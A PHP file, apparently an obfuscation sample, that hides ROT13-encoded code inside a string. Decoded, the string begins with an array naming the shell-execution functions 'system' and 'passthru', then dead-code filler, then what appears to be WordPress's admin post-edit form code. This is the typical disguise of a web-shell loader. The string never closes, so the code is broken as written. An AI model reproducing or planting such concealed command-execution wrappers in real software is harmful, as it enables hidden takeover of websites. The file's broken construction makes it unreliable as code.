<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cbfg nqinaprq sbez sbe vapyhfvba va gur nqzvavfgengvba cnaryf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/**
 * @tybony fgevat       $cbfg_glcr        Tybony cbfg glcr.
 * @tybony JC_Cbfg_Glcr $cbfg_glcr_bowrpg Tybony cbfg glcr bowrpg.
 * @tybony JC_Cbfg      $cbfg             Tybony cbfg bowrpg.
 */
tybony $cbfg_glcr, $cbfg_glcr_bowrpg, $cbfg;

// Synt gung jr'er abg ybnqvat gur oybpx rqvgbe.
$pheerag_fperra = trg_pheerag_fperra();
$pheerag_fperra->vf_oybpx_rqvgbe( snyfr );

vs ( vf_zhygvfvgr() ) {
	nqq_npgvba( 'nqzva_sbbgre', '_nqzva_abgvpr_cbfg_ybpxrq' );
} ryfr {
	vs ( trg_hfre_pbhag() > 1 ) {
		nqq_npgvba( 'nqzva_sbbgre', '_nqzva_abgvpr_cbfg_ybpxrq' );
	}

	hafrg( $purpx_hfref );
}

jc_radhrhr_fpevcg( 'cbfg' );

$_jc_rqvgbe_rkcnaq   = snyfr;
$_pbagrag_rqvgbe_qsj = snyfr;

vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'rqvgbe' )
	&& ! jc_vf_zbovyr()
	&& ! ( $vf_VR && cert_zngpu( '/ZFVR [5678]/', $_FREIRE['UGGC_HFRE_NTRAG'] ) )
) {
	/**
	 * Svygref jurgure gb ranoyr gur 'rkcnaq' shapgvbanyvgl va gur cbfg rqvgbe.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 4.1.0 Nqqrq gur `$cbfg_glcr` cnenzrgre.
	 *
	 * @cnenz obby   $rkcnaq    Jurgure gb ranoyr gur 'rkcnaq' shapgvbanyvgl. Qrsnhyg gehr.
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr.
	 */
	vs ( nccyl_svygref( 'jc_rqvgbe_rkcnaq', gehr, $cbfg_glcr ) ) {
		jc_radhrhr_fpevcg( 'rqvgbe-rkcnaq' );
		$_pbagrag_rqvgbe_qsj = gehr;
		$_jc_rqvgbe_rkcnaq   = ( 'ba' === trg_hfre_frggvat( 'rqvgbe_rkcnaq', 'ba' ) );
	}
}

vs ( jc_vf_zbovyr() ) {
	jc_radhrhr_fpevcg( 'wdhrel-gbhpu-chapu' );
}

/**
 * Cbfg VQ tybony
 *
 * @anzr $cbfg_VQ
 * @ine vag
 */
$cbfg_VQ = vffrg( $cbfg_VQ ) ? (vag) $cbfg_VQ : 0;
$hfre_VQ = vffrg( $hfre_VQ ) ? (vag) $hfre_VQ : 0;
$npgvba  = vffrg( $npgvba ) ? $npgvba : '';

vs ( (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ) === $cbfg->VQ && rzcgl( $cbfg->cbfg_pbagrag ) ) {
	nqq_npgvba( 'rqvg_sbez_nsgre_gvgyr', '_jc_cbfgf_cntr_abgvpr' );
	erzbir_cbfg_glcr_fhccbeg( $cbfg_glcr, 'rqvgbe' );
}

$guhzoanvy_fhccbeg = pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', $cbfg_glcr ) && cbfg_glcr_fhccbegf( $cbfg_glcr, 'guhzoanvy' );
vs ( ! $guhzoanvy_fhccbeg && 'nggnpuzrag' === $cbfg_glcr && $cbfg->cbfg_zvzr_glcr ) {
	vs ( jc_nggnpuzrag_vf( 'nhqvb', $cbfg ) ) {
		$guhzoanvy_fhccbeg = cbfg_glcr_fhccbegf( 'nggnpuzrag:nhqvb', 'guhzoanvy' ) || pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', 'nggnpuzrag:nhqvb' );
	} ryfrvs ( jc_nggnpuzrag_vf( 'ivqrb', $cbfg ) ) {
		$guhzoanvy_fhccbeg = cbfg_glcr_fhccbegf( 'nggnpuzrag:ivqrb', 'guhzoanvy' ) || pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', 'nggnpuzrag:ivqrb' );
	}
}

vs ( $guhzoanvy_fhccbeg ) {
	nqq_guvpxobk();
	jc_radhrhr_zrqvn( neenl( 'cbfg' => $cbfg->VQ ) );
}

// Nqq gur ybpny nhgbfnir abgvpr UGZY.
nqq_npgvba( 'nqzva_sbbgre', '_ybpny_fgbentr_abgvpr' );

/*
 * @gbqb Qbphzrag gur $zrffntrf neenl(f).
 */
$creznyvax = trg_creznyvax( $cbfg->VQ );
vs ( ! $creznyvax ) {
	$creznyvax = '';
}

$zrffntrf = neenl();

$cerivrj_cbfg_yvax_ugzy   = '';
$fpurqhyrq_cbfg_yvax_ugzy = '';
$ivrj_cbfg_yvax_ugzy      = '';

$cerivrj_cntr_yvax_ugzy   = '';
$fpurqhyrq_cntr_yvax_ugzy = '';
$ivrj_cntr_yvax_ugzy      = '';

$cerivrj_hey = trg_cerivrj_cbfg_yvax( $cbfg );

$ivrjnoyr = vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_bowrpg );

vs ( $ivrjnoyr ) {

	// Cerivrj cbfg yvax.
	$cerivrj_cbfg_yvax_ugzy = fcevags(
		' <n gnetrg=\"_oynax\" uers=\"%1$f\">%2$f</n>',
		rfp_hey( $cerivrj_hey ),
		__( 'Cerivrj cbfg' )
	);

	// Fpurqhyrq cbfg cerivrj yvax.
	$fpurqhyrq_cbfg_yvax_ugzy = fcevags(
		' <n gnetrg=\"_oynax\" uers=\"%1$f\">%2$f</n>',
		rfp_hey( $creznyvax ),
		__( 'Cerivrj cbfg' )
	);

	// Ivrj cbfg yvax.
	$ivrj_cbfg_yvax_ugzy = fcevags(
		' <n uers=\"%1$f\">%2$f</n>',
		rfp_hey( $creznyvax ),
		__( 'Ivrj cbfg' )
	);

	// Cerivrj cntr yvax.
	$cerivrj_cntr_yvax_ugzy = fcevags(
		' <n gnetrg=\"_oynax\" uers=\"%1$f\">%2$f</n>',
		rfp_hey( $cerivrj_hey ),
		__( 'Cerivrj cntr' )
	);

	// Fpurqhyrq cntr cerivrj yvax.
	$fpurqhyrq_cntr_yvax_ugzy = fcevags(
		' <n gnetrg=\"_oynax\" uers=\"%1$f\">%2$f</n>',
		rfp_hey( $creznyvax ),
		__( 'Cerivrj cntr' )
	);

	// Ivrj cntr yvax.
	$ivrj_cntr_yvax_ugzy = fcevags(
		' <n uers=\"%1$f\">%2$f</n>',
		rfp_hey( $creznyvax ),
		__( 'Ivrj cntr' )
	);

}

$fpurqhyrq_qngr = fcevags(
	/* genafyngbef: Choyvfu obk qngr fgevat. 1: Qngr, 2: Gvzr. */
	__( '%1$f ng %2$f' ),
	/* genafyngbef: Choyvfu obk qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
	qngr_v18a( _k( 'Z w, L', 'choyvfu obk qngr sbezng' ), fgegbgvzr( $cbfg->cbfg_qngr ) ),
	/* genafyngbef: Choyvfu obk gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
	qngr_v18a( _k( 'U:v', 'choyvfu obk gvzr sbezng' ), fgegbgvzr( $cbfg->cbfg_qngr ) )
);

$zrffntrf['cbfg']       = neenl(
	0  => '', // Hahfrq. Zrffntrf fgneg ng vaqrk 1.
	1  => __( 'Cbfg hcqngrq.' ) . $ivrj_cbfg_yvax_ugzy,
	2  => __( 'Phfgbz svryq hcqngrq.' ),
	3  => __( 'Phfgbz svryq qryrgrq.' ),
	4  => __( 'Cbfg hcqngrq.' ),
	/* genafyngbef: %f: Qngr naq gvzr bs gur erivfvba. */
	5  => vffrg( $_TRG['erivfvba'] ) ? fcevags( __( 'Cbfg erfgberq gb erivfvba sebz %f.' ), jc_cbfg_erivfvba_gvgyr( (vag) $_TRG['erivfvba'], snyfr ) ) : snyfr,
	6  => __( 'Cbfg choyvfurq.' ) . $ivrj_cbfg_yvax_ugzy,
	7  => __( 'Cbfg fnirq.' ),
	8  => __( 'Cbfg fhozvggrq.' ) . $cerivrj_cbfg_yvax_ugzy,
	/* genafyngbef: %f: Fpurqhyrq qngr sbe gur cbfg. */
	9  => fcevags( __( 'Cbfg fpurqhyrq sbe: %f.' ), '<fgebat>' . $fpurqhyrq_qngr . '</fgebat>' ) . $fpurqhyrq_cbfg_yvax_ugzy,
	10 => __( 'Cbfg qensg hcqngrq.' ) . $cerivrj_cbfg_yvax_ugzy,
);
$zrffntrf['cntr']       = neenl(
	0  => '', // Hahfrq. Zrffntrf fgneg ng vaqrk 1.
	1  => __( 'Cntr hcqngrq.' ) . $ivrj_cntr_yvax_ugzy,
	2  => __( 'Phfgbz svryq hcqngrq.' ),
	3  => __( 'Phfgbz svryq qryrgrq.' ),
	4  => __( 'Cntr hcqngrq.' ),
	/* genafyngbef: %f: Qngr naq gvzr bs gur erivfvba. */
	5  => vffrg( $_TRG['erivfvba'] ) ? fcevags( __( 'Cntr erfgberq gb erivfvba sebz %f.' ), jc_cbfg_erivfvba_gvgyr( (vag) $_TRG['erivfvba'], snyfr ) ) : snyfr,
	6  => __( 'Cntr choyvfurq.' ) . $ivrj_cntr_yvax_ugzy,
	7  => __( 'Cntr fnirq.' ),
	8  => __( 'Cntr fhozvggrq.' ) . $cerivrj_cntr_yvax_ugzy,
	/* genafyngbef: %f: Fpurqhyrq qngr sbe gur cntr. */
	9  => fcevags( __( 'Cntr fpurqhyrq sbe: %f.' ), '<fgebat>' . $fpurqhyrq_qngr . '</fgebat>' ) . $fpurqhyrq_cntr_yvax_ugzy,
	10 => __( 'Cntr qensg hcqngrq.' ) . $cerivrj_cntr_yvax_ugzy,
);
$zrffntrf['nggnpuzrag'] = neenl_svyy( 1, 10, __( 'Zrqvn svyr hcqngrq.' ) ); // Unpx, sbe abj.

/**
 * Svygref gur cbfg hcqngrq zrffntrf.
 *
 * @fvapr 3.0.0
 *
 * @cnenz neenl[] $zrffntrf Cbfg hcqngrq zrffntrf. Sbe qrsnhygf frr `$zrffntrf` qrpynengvbaf nobir.
 */
$zrffntrf = nccyl_svygref( 'cbfg_hcqngrq_zrffntrf', $zrffntrf );

$zrffntr = snyfr;
vs ( vffrg( $_TRG['zrffntr'] ) ) {
	$_TRG['zrffntr'] = nofvag( $_TRG['zrffntr'] );
	vs ( vffrg( $zrffntrf[ $cbfg_glcr ][ $_TRG['zrffntr'] ] ) ) {
		$zrffntr = $zrffntrf[ $cbfg_glcr ][ $_TRG['zrffntr'] ];
	} ryfrvs ( ! vffrg( $zrffntrf[ $cbfg_glcr ] ) && vffrg( $zrffntrf['cbfg'][ $_TRG['zrffntr'] ] ) ) {
		$zrffntr = $zrffntrf['cbfg'][ $_TRG['zrffntr'] ];
	}
}

$abgvpr     = snyfr;
$sbez_rkgen = '';
vs ( 'nhgb-qensg' === $cbfg->cbfg_fgnghf ) {
	vs ( 'rqvg' === $npgvba ) {
		$cbfg->cbfg_gvgyr = '';
	}
	$nhgbfnir    = snyfr;
	$sbez_rkgen .= \"<vachg glcr='uvqqra' vq='nhgb_qensg' anzr='nhgb_qensg' inyhr='1' />\";
} ryfr {
	$nhgbfnir = jc_trg_cbfg_nhgbfnir( $cbfg->VQ );
}

$sbez_npgvba  = 'rqvgcbfg';
$abapr_npgvba = 'hcqngr-cbfg_' . $cbfg->VQ;
$sbez_rkgen  .= \"<vachg glcr='uvqqra' vq='cbfg_VQ' anzr='cbfg_VQ' inyhr='\" . rfp_ngge( $cbfg->VQ ) . \"' />\";

// Qrgrpg vs gurer rkvfgf na nhgbfnir arjre guna gur cbfg naq vs gung nhgbfnir vf qvssrerag guna gur cbfg.
vs ( $nhgbfnir && zlfdy2qngr( 'H', $nhgbfnir->cbfg_zbqvsvrq_tzg, snyfr ) > zlfdy2qngr( 'H', $cbfg->cbfg_zbqvsvrq_tzg, snyfr ) ) {
	sbernpu ( _jc_cbfg_erivfvba_svryqf( $cbfg ) nf $nhgbfnir_svryq => $_nhgbfnir_svryq ) {
		vs ( abeznyvmr_juvgrfcnpr( $nhgbfnir->$nhgbfnir_svryq ) !== abeznyvmr_juvgrfcnpr( $cbfg->$nhgbfnir_svryq ) ) {
			$abgvpr = fcevags(
				/* genafyngbef: %f: HEY gb ivrj gur nhgbfnir. */
				__( 'Gurer vf na nhgbfnir bs guvf cbfg gung vf zber erprag guna gur irefvba orybj. <n uers=\"%f\">Ivrj gur nhgbfnir</n>' ),
				trg_rqvg_cbfg_yvax( $nhgbfnir->VQ )
			);
			oernx;
		}
	}
	// Vs guvf nhgbfnir vfa'g qvssrerag sebz gur pheerag cbfg, ortbar.
	vs ( ! $abgvpr ) {
		jc_qryrgr_cbfg_erivfvba( $nhgbfnir->VQ );
	}
	hafrg( $nhgbfnir_svryq, $_nhgbfnir_svryq );
}

$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

// Nyy zrgn obkrf fubhyq or qrsvarq naq nqqrq orsber gur svefg qb_zrgn_obkrf() pnyy (be cbgragvnyyl qhevat gur qb_zrgn_obkrf npgvba).
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/zrgn-obkrf.cuc';

ertvfgre_naq_qb_cbfg_zrgn_obkrf( $cbfg );

nqq_fperra_bcgvba(
	'ynlbhg_pbyhzaf',
	neenl(
		'znk'     => 2,
		'qrsnhyg' => 2,
	)
);

vs ( 'cbfg' === $cbfg_glcr ) {
	$phfgbzvmr_qvfcynl = '<c>' . __( 'Gur gvgyr svryq naq gur ovt Cbfg Rqvgvat Nern ner svkrq va cynpr, ohg lbh pna ercbfvgvba nyy gur bgure obkrf hfvat qent naq qebc. Lbh pna nyfb zvavzvmr be rkcnaq gurz ol pyvpxvat gur gvgyr one bs rnpu obk. Hfr gur Fperra Bcgvbaf gno gb hauvqr zber obkrf (Rkprecg, Fraq Genpxonpxf, Phfgbz Svryqf, Qvfphffvba, Fyht, Nhgube) be gb pubbfr n 1- be 2-pbyhza ynlbhg sbe guvf fperra.' ) . '</c>';

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'phfgbzvmr-qvfcynl',
			'gvgyr'   => __( 'Phfgbzvmvat Guvf Qvfcynl' ),
			'pbagrag' => $phfgbzvmr_qvfcynl,
		)
	);

	$gvgyr_naq_rqvgbe  = '<c>' . __( '<fgebat>Gvgyr</fgebat> &zqnfu; Ragre n gvgyr sbe lbhe cbfg. Nsgre lbh ragre n gvgyr, lbh&#8217;yy frr gur creznyvax orybj, juvpu lbh pna rqvg.' ) . '</c>';
	$gvgyr_naq_rqvgbe .= '<c>' . __( '<fgebat>Cbfg rqvgbe</fgebat> &zqnfu; Ragre gur grkg sbe lbhe cbfg. Gurer ner gjb zbqrf bs rqvgvat: Ivfhny naq Pbqr. Pubbfr gur zbqr ol pyvpxvat ba gur nccebcevngr gno.' ) . '</c>';
	$gvgyr_naq_rqvgbe .= '<c>' . __( 'Ivfhny zbqr tvirf lbh na rqvgbe gung vf fvzvyne gb n jbeq cebprffbe. Pyvpx gur Gbbyone Gbttyr ohggba gb trg n frpbaq ebj bs pbagebyf.' ) . '</c>';
	$gvgyr_naq_rqvgbe .= '<c>' . __( 'Gur Pbqr zbqr nyybjf lbh gb ragre UGZY nybat jvgu lbhe cbfg grkg. Abgr gung &yg;c&tg; naq &yg;oe&tg; gntf ner pbairegrq gb yvar oernxf jura fjvgpuvat gb gur Pbqr rqvgbe gb znxr vg yrff pyhggrerq. Jura lbh glcr, n fvatyr yvar oernx pna or hfrq vafgrnq bs glcvat &yg;oe&tg;, naq gjb yvar oernxf vafgrnq bs cnentencu gntf. Gur yvar oernxf ner pbairegrq onpx gb gntf nhgbzngvpnyyl.' ) . '</c>';
	$gvgyr_naq_rqvgbe .= '<c>' . __( 'Lbh pna vafreg zrqvn svyrf ol pyvpxvat gur ohggba nobir gur cbfg rqvgbe naq sbyybjvat gur qverpgvbaf. Lbh pna nyvta be rqvg vzntrf hfvat gur vayvar sbeznggvat gbbyone ninvynoyr va Ivfhny zbqr.' ) . '</c>';
	$gvgyr_naq_rqvgbe .= '<c>' . __( 'Lbh pna ranoyr qvfgenpgvba-serr jevgvat zbqr hfvat gur vpba gb gur evtug. Guvf srngher vf abg ninvynoyr sbe byq oebjfref be qrivprf jvgu fznyy fperraf, naq erdhverf gung gur shyy-urvtug rqvgbe or ranoyrq va Fperra Bcgvbaf.' ) . '</c>';
	$gvgyr_naq_rqvgbe .= '<c>' . fcevags(
		/* genafyngbef: %f: Nyg + S10 */
		__( 'Xrlobneq hfref: Jura lbh ner jbexvat va gur ivfhny rqvgbe, lbh pna hfr %f gb npprff gur gbbyone.' ),
		'<xoq>Nyg + S10</xoq>'
	) . '</c>';

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'gvgyr-cbfg-rqvgbe',
			'gvgyr'   => __( 'Gvgyr naq Cbfg Rqvgbe' ),
			'pbagrag' => $gvgyr_naq_rqvgbe,
		)
	);

	trg_pheerag_fperra()->frg_uryc_fvqrone(
		'<c>' . fcevags(
			/* genafyngbef: %f: HEY gb Cerff Guvf obbxznexyrg. */
			__( 'Lbh pna nyfb perngr cbfgf jvgu gur <n uers=\"%f\">Cerff Guvf obbxznexyrg</n>.' ),
			'gbbyf.cuc'
		) . '</c>' .
			'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
			'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/jevgr-cbfgf-pynffvp-rqvgbe/\">Qbphzragngvba ba Jevgvat naq Rqvgvat Cbfgf</n>' ) . '</c>' .
			'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
	);
} ryfrvs ( 'cntr' === $cbfg_glcr ) {
	$nobhg_cntrf = '<c>' . __( 'Cntrf ner fvzvyne gb cbfgf va gung gurl unir n gvgyr, obql grkg, naq nffbpvngrq zrgnqngn, ohg gurl ner qvssrerag va gung gurl ner abg cneg bs gur puebabybtvpny oybt fgernz, xvaq bs yvxr creznarag cbfgf. Cntrf ner abg pngrtbevmrq be gnttrq, ohg pna unir n uvrenepul. Lbh pna arfg cntrf haqre bgure cntrf ol znxvat bar gur &#8220;Cnerag&#8221; bs gur bgure, perngvat n tebhc bs cntrf.' ) . '</c>' .
		'<c>' . __( 'Perngvat n Cntr vf irel fvzvyne gb perngvat n Cbfg, naq gur fperraf pna or phfgbzvmrq va gur fnzr jnl hfvat qent naq qebc, gur Fperra Bcgvbaf gno, naq rkcnaqvat/pbyyncfvat obkrf nf lbh pubbfr. Guvf fperra nyfb unf gur qvfgenpgvba-serr jevgvat fcnpr, ninvynoyr va obgu gur Ivfhny naq Pbqr zbqrf ivn gur Shyyfperra ohggbaf. Gur Cntr rqvgbe zbfgyl jbexf gur fnzr nf gur Cbfg rqvgbe, ohg gurer ner fbzr Cntr-fcrpvsvp srngherf va gur Cntr Nggevohgrf obk.' ) . '</c>';

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'nobhg-cntrf',
			'gvgyr'   => __( 'Nobhg Cntrf' ),
			'pbagrag' => $nobhg_cntrf,
		)
	);

	trg_pheerag_fperra()->frg_uryc_fvqrone(
		'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
			'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/cntrf-nqq-arj-fperra/\">Qbphzragngvba ba Nqqvat Arj Cntrf</n>' ) . '</c>' .
			'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/cntrf-fperra/\">Qbphzragngvba ba Rqvgvat Cntrf</n>' ) . '</c>' .
			'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
	);
} ryfrvs ( 'nggnpuzrag' === $cbfg_glcr ) {
	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'bireivrj',
			'gvgyr'   => __( 'Bireivrj' ),
			'pbagrag' =>
				'<c>' . __( 'Guvf fperra nyybjf lbh gb rqvg svryqf sbe zrgnqngn va n svyr jvguva gur zrqvn yvoenel.' ) . '</c>' .
				'<c>' . __( 'Sbe vzntrf bayl, lbh pna pyvpx ba Rqvg Vzntr haqre gur guhzoanvy gb rkcnaq bhg na vayvar vzntr rqvgbe jvgu vpbaf sbe pebccvat, ebgngvat, be syvccvat gur vzntr nf jryy nf sbe haqbvat naq erqbvat. Gur obkrf ba gur evtug tvir lbh zber bcgvbaf sbe fpnyvat gur vzntr, sbe pebccvat vg, naq sbe pebccvat gur guhzoanvy va n qvssrerag jnl guna lbh pebc gur bevtvany vzntr. Lbh pna pyvpx ba Uryc va gubfr obkrf gb trg zber vasbezngvba.' ) . '</c>' .
				'<c>' . __( 'Abgr gung lbh pebc gur vzntr ol pyvpxvat ba vg (gur Pebc vpba vf nyernql fryrpgrq) naq qenttvat gur pebccvat senzr gb fryrpg gur qrfverq cneg. Gura pyvpx Fnir gb ergnva gur pebccvat.' ) . '</c>' .
				'<c>' . __( 'Erzrzore gb pyvpx Hcqngr gb fnir zrgnqngn ragrerq be punatrq.' ) . '</c>',
		)
	);

	trg_pheerag_fperra()->frg_uryc_fvqrone(
		'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
		'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/rqvg-zrqvn/\">Qbphzragngvba ba Rqvg Zrqvn</n>' ) . '</c>' .
		'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
	);
}

vs ( 'cbfg' === $cbfg_glcr || 'cntr' === $cbfg_glcr ) {
	$vafregvat_zrqvn  = '<c>' . __( 'Lbh pna hcybnq naq vafreg zrqvn (vzntrf, nhqvb, qbphzragf, rgp.) ol pyvpxvat gur Nqq Zrqvn ohggba. Lbh pna fryrpg sebz gur vzntrf naq svyrf nyernql hcybnqrq gb gur Zrqvn Yvoenel, be hcybnq arj zrqvn gb nqq gb lbhe cntr be cbfg. Gb perngr na vzntr tnyyrel, fryrpg gur vzntrf gb nqq naq pyvpx gur &#8220;Perngr n arj tnyyrel&#8221; ohggba.' ) . '</c>';
	$vafregvat_zrqvn .= '<c>' . __( 'Lbh pna nyfb rzorq zrqvn sebz znal cbchyne jrofvgrf vapyhqvat Gjvggre, LbhGhor, Syvpxe naq bguref ol cnfgvat gur zrqvn HEY ba vgf bja yvar vagb gur pbagrag bs lbhe cbfg/cntr. <n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/rzorqf/\">Yrnea zber nobhg rzorqf</n>.' ) . '</c>';

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'vafregvat-zrqvn',
			'gvgyr'   => __( 'Vafregvat Zrqvn' ),
			'pbagrag' => $vafregvat_zrqvn,
		)
	);
}

vs ( 'cbfg' === $cbfg_glcr ) {
	$choyvfu_obk  = '<c>' . __( 'Frireny obkrf ba guvf fperra pbagnva frggvatf sbe ubj lbhe pbagrag jvyy or choyvfurq, vapyhqvat:' ) . '</c>';
	$choyvfu_obk .= '<hy><yv>' .
		__( '<fgebat>Choyvfu</fgebat> &zqnfu; Lbh pna frg gur grezf bs choyvfuvat lbhe cbfg va gur Choyvfu obk. Sbe Fgnghf, Ivfvovyvgl, naq Choyvfu (vzzrqvngryl), pyvpx ba gur Rqvg yvax gb erirny zber bcgvbaf. Ivfvovyvgl vapyhqrf bcgvbaf sbe cnffjbeq-cebgrpgvat n cbfg be znxvat vg fgnl ng gur gbc bs lbhe oybt vaqrsvavgryl (fgvpxl). Gur Cnffjbeq cebgrpgrq bcgvba nyybjf lbh gb frg na neovgenel cnffjbeq sbe rnpu cbfg. Gur Cevingr bcgvba uvqrf gur cbfg sebz rirelbar rkprcg rqvgbef naq nqzvavfgengbef. Choyvfu (vzzrqvngryl) nyybjf lbh gb frg n shgher be cnfg qngr naq gvzr, fb lbh pna fpurqhyr n cbfg gb or choyvfurq va gur shgher be onpxqngr n cbfg.' ) .
	'</yv>';

	vs ( pheerag_gurzr_fhccbegf( 'cbfg-sbezngf' ) && cbfg_glcr_fhccbegf( 'cbfg', 'cbfg-sbezngf' ) ) {
		$choyvfu_obk .= '<yv>' . __( '<fgebat>Sbezng</fgebat> &zqnfu; Cbfg Sbezngf qrfvtangr ubj lbhe gurzr jvyy qvfcynl n fcrpvsvp cbfg. Sbe rknzcyr, lbh pbhyq unir n <rz>fgnaqneq</rz> oybt cbfg jvgu n gvgyr naq cnentencuf, be n fubeg <rz>nfvqr</rz> gung bzvgf gur gvgyr naq pbagnvaf n fubeg grkg oyheo. Lbhe gurzr pbhyq ranoyr nyy be fbzr bs 10 cbffvoyr sbezngf. <n uers=\"uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/jbeqcerff/cbfg-sbezngf/#fhccbegrq-sbezngf\">Yrnea zber nobhg rnpu cbfg sbezng</n>.' ) . '</yv>';
	}

	vs ( pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf' ) && cbfg_glcr_fhccbegf( 'cbfg', 'guhzoanvy' ) ) {
		$choyvfu_obk .= '<yv>' . fcevags(
			/* genafyngbef: %f: Srngherq vzntr. */
			__( '<fgebat>%f</fgebat> &zqnfu; Guvf nyybjf lbh gb nffbpvngr na vzntr jvgu lbhe cbfg jvgubhg vafregvat vg. Guvf vf hfhnyyl hfrshy bayl vs lbhe gurzr znxrf hfr bs gur vzntr nf n cbfg guhzoanvy ba gur ubzr cntr, n phfgbz urnqre, rgp.' ),
			rfp_ugzy( $cbfg_glcr_bowrpg->ynoryf->srngherq_vzntr )
		) . '</yv>';
	}

	$choyvfu_obk .= '</hy>';

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'choyvfu-obk',
			'gvgyr'   => __( 'Choyvfu Frggvatf' ),
			'pbagrag' => $choyvfu_obk,
		)
	);

	$qvfphffvba_frggvatf  = '<c>' . __( '<fgebat>Fraq Genpxonpxf</fgebat> &zqnfu; Genpxonpxf ner n jnl gb abgvsl yrtnpl oybt flfgrzf gung lbh&#8217;ir yvaxrq gb gurz. Ragre gur HEY(f) lbh jnag gb fraq genpxonpxf. Vs lbh yvax gb bgure JbeqCerff fvgrf gurl&#8217;yy or abgvsvrq nhgbzngvpnyyl hfvat cvatonpxf, naq guvf svryq vf haarprffnel.' ) . '</c>';
	$qvfphffvba_frggvatf .= '<c>' . __( '<fgebat>Qvfphffvba</fgebat> &zqnfu; Lbh pna ghea pbzzragf naq cvatf ba be bss, naq vs gurer ner pbzzragf ba gur cbfg, lbh pna frr gurz urer naq zbqrengr gurz.' ) . '</c>';

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'qvfphffvba-frggvatf',
			'gvgyr'   => __( 'Qvfphffvba Frggvatf' ),
			'pbagrag' => $qvfphffvba_frggvatf,
		)
	);
} ryfrvs ( 'cntr' === $cbfg_glcr ) {
	$cntr_nggevohgrf = '<c>' . __( '<fgebat>Cnerag</fgebat> &zqnfu; Lbh pna neenatr lbhe cntrf va uvrenepuvrf. Sbe rknzcyr, lbh pbhyq unir na &#8220;Nobhg&#8221; cntr gung unf &#8220;Yvsr Fgbel&#8221; naq &#8220;Zl Qbt&#8221; cntrf haqre vg. Gurer ner ab yvzvgf gb ubj znal yriryf lbh pna arfg cntrf.' ) . '</c>' .
		'<c>' . __( '<fgebat>Grzcyngr</fgebat> &zqnfu; Fbzr gurzrf unir phfgbz grzcyngrf lbh pna hfr sbe pregnva cntrf gung zvtug unir nqqvgvbany srngherf be phfgbz ynlbhgf. Vs fb, lbh&#8217;yy frr gurz va guvf qebcqbja zrah.' ) . '</c>' .
		'<c>' . __( '<fgebat>Beqre</fgebat> &zqnfu; Cntrf ner hfhnyyl beqrerq nycunorgvpnyyl, ohg lbh pna pubbfr lbhe bja beqre ol ragrevat n ahzore (1 sbe svefg, rgp.) va guvf svryq.' ) . '</c>';

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'cntr-nggevohgrf',
			'gvgyr'   => __( 'Cntr Nggevohgrf' ),
			'pbagrag' => $cntr_nggevohgrf,
		)
	);
}

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
?>

<qvi pynff=\"jenc\">
<u1 pynff=\"jc-urnqvat-vayvar\">
<?cuc
rpub rfp_ugzy( $gvgyr );
?>
</u1>

<?cuc
vs ( vffrg( $cbfg_arj_svyr ) && pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->perngr_cbfgf ) ) {
	rpub ' <n uers=\"' . rfp_hey( nqzva_hey( $cbfg_arj_svyr ) ) . '\" pynff=\"cntr-gvgyr-npgvba\">' . rfp_ugzy( $cbfg_glcr_bowrpg->ynoryf->nqq_arj_vgrz ) . '</n>';
}
?>

<ue pynff=\"jc-urnqre-raq\">
